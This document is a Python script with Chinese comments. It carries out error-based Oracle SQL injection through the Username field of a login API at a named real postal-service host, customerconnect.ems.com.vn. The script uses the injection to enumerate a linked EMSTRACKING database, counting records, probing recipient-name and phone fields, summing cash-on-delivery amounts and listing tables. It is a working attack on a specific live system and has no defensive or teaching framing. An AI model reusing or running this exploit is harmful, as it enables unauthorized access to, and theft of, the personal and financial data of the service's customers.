#!/usr/bin/env python3
"""
深入了解EMSTRACKING数据库的10,322条数据
"""

import requests
import json
import time

class EMSTrackingAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def analyze_emstracking_data(self):
        """分析EMSTRACKING的数据"""
        print("=" * 80)
        print("🔍 分析EMSTRACKING数据库的10,322条数据")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", 
             f"SELECT COUNT(*) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}'"),
            
            ("不同的MABC数（去重）", 
             f"SELECT COUNT(DISTINCT MABC) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}'"),
            
            ("有收件人的记录", 
             f"SELECT COUNT(*) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL"),
            
            ("有电话的记录", 
             f"SELECT COUNT(*) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            
            ("样本MABC", 
             f"SELECT MABC FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}' AND ROWNUM<=3"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            else:
                print(f"   ❌ 查询失败")
            time.sleep(2)
    
    def compare_local_vs_tracking(self):
        """对比本地数据库和EMSTRACKING"""
        print("\n" + "=" * 80)
        print("📊 对比本地数据库 vs EMSTRACKING")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n本地数据库（customerconnect）:")
        
        # 本地E1E2_PH
        query1 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
        local_total = self.extract_via_error(query1)
        if local_total:
            print(f"   E1E2_PH总记录: {local_total}")
        
        query2 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
        local_mabc = self.extract_via_error(query2)
        if local_mabc:
            print(f"   不同MABC: {local_mabc}")
        
        time.sleep(2)
        
        print("\nEMSTRACKING数据库:")
        
        # EMSTRACKING E1E2_PH
        query3 = f"SELECT COUNT(*) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}'"
        tracking_total = self.extract_via_error(query3)
        if tracking_total:
            print(f"   E1E2_PH总记录: {tracking_total}")
        
        query4 = f"SELECT COUNT(DISTINCT MABC) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}'"
        tracking_mabc = self.extract_via_error(query4)
        if tracking_mabc:
            print(f"   不同MABC: {tracking_mabc}")
        
        time.sleep(2)
        
        # 分析
        print("\n💡 分析:")
        if local_total and tracking_total:
            if local_total == tracking_total:
                print("   ✅ 两个数据库的数据完全相同！")
                print("   说明：EMSTRACKING可能是本地的镜像/备份")
            elif int(tracking_total) < int(local_total):
                print("   ⚠️  EMSTRACKING数据比本地少")
                print("   说明：可能是不同的业务系统或区域")
            else:
                print("   ⚠️  EMSTRACKING数据比本地多")
                print(f"   差异：{int(tracking_total) - int(local_total)} 条")
                print("   说明：EMSTRACKING可能包含更多业务数据！")
    
    def check_mabc_overlap(self):
        """检查两个数据库的MABC是否重叠"""
        print("\n" + "=" * 80)
        print("🔍 检查本地和EMSTRACKING的MABC是否重叠")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取本地的一个MABC
        query1 = f"SELECT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND ROWNUM=1"
        local_mabc = self.extract_via_error(query1)
        
        if local_mabc:
            print(f"\n本地样本MABC: {local_mabc}")
            
            # 检查这个MABC在EMSTRACKING是否存在
            query2 = f"SELECT COUNT(*) FROM E1E2_PH@EMSTRACKING WHERE MABC='{local_mabc}' AND NGAY='{date}'"
            exists = self.extract_via_error(query2)
            
            if exists and int(exists) > 0:
                print(f"   ✅ 在EMSTRACKING中存在: {exists}条")
                print("   说明：两个库有相同数据，可能是同步/镜像关系")
            else:
                print(f"   ❌ 在EMSTRACKING中不存在")
                print("   说明：两个库的数据不同，是独立系统")
            
            time.sleep(2)
    
    def check_what_is_emstracking(self):
        """了解EMSTRACKING是什么系统"""
        print("\n" + "=" * 80)
        print("❓ EMSTRACKING是什么系统？")
        print("=" * 80)
        
        print("\n🔍 检查EMSTRACKING数据库的表结构:")
        
        # 查询EMSTRACKING有哪些表
        for i in range(1, 10):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES@EMSTRACKING WHERE OWNER='EMS') WHERE RN={i}"
            table = self.extract_via_error(query)
            if table:
                print(f"   {i}. {table}")
            time.sleep(1)
    
    def estimate_tracking_volume(self):
        """估算EMSTRACKING的业务量"""
        print("\n" + "=" * 80)
        print("📈 EMSTRACKING业务量分析")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("代收金额总计", 
             f"SELECT SUM(SO_TIEN_THU_HO) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}'"),
            
            ("有代收的订单数", 
             f"SELECT COUNT(DISTINCT MABC) FROM E1E2_PH@EMSTRACKING WHERE NGAY='{date}' AND SO_TIEN_THU_HO>0"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                if result.isdigit() and int(result) > 1000000:
                    amount = int(result)
                    print(f"   ✅ {amount:,} VND")
                    print(f"   💵 约 ${amount/23000:,.0f} USD")
                else:
                    print(f"   ✅ {result}")
            time.sleep(2)
    
    def run_analysis(self):
        """执行完整分析"""
        print("=" * 80)
        print("🔬 EMSTRACKING数据深度分析")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行分析
        self.analyze_emstracking_data()
        self.compare_local_vs_tracking()
        self.check_mabc_overlap()
        self.estimate_tracking_volume()
        self.check_what_is_emstracking()
        
        print("\n" + "=" * 80)
        print("📊 结论")
        print("=" * 80)
        
        print("\nEMSTRACKING的10,322条数据可能是:")
        print("  1️⃣ 跟踪系统的邮件处理记录")
        print("  2️⃣ 与本地数据库同步的镜像数据")
        print("  3️⃣ 或者是另一个区域/业务线的数据")
        print("\n需要通过对比分析才能确定！")
        
        print("\n" + "=" * 80)
        print("🎉 分析完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    analyzer = EMSTrackingAnalyzer(target_url)
    analyzer.run_analysis()
